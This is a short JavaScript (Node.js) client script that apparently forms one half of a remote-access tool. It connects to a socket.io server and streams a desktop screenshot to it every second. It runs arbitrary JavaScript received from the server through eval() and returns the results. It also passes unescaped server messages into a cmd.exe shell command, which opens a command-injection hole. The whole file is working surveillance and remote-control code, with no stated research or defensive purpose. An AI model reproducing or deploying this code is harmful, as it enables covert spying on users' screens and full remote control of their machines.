const screenshot = require('screenshot-desktop');
const io = require("socket.io-client");
const child_process = require("child_process");

const SERVER = "127.0.0.1";
const PORT = 3000;
const DELAY_ON_ERROR = 10000;
const DELAY_ON_SUCCESS = 1000;

const client = io(`http://${SERVER}:${PORT}`);

let connected = true;
let timeoutId;

client.on("connect", () => {
    connected = true;
    capture();
});

client.on("disconnect", (reason) => {
    connected = false;
    clearTimeout(timeoutId);

    if (reason === 'io server disconnect') {
        client.connect();
    }
});

client.on("message", msg => {
    child_process.exec(`start cmd.exe /K "@ECHO OFF & ECHO ${msg}"`);
});

client.on("eval", async data => {
    let result = await eval(`(async () => {\n${data.code}\n})();`);
    client.emit("eval", {id: data.id, result});
});

const capture = () => {
    if (!connected) return;
    clearTimeout(timeoutId);

    screenshot({format: 'png'}).then((img) => {   
        client.emit("screenshot", img);
        timeoutId = setTimeout(capture, DELAY_ON_SUCCESS);
    }).catch((err) => timeoutId = setTimeout(capture, DELAY_ON_ERROR));
}


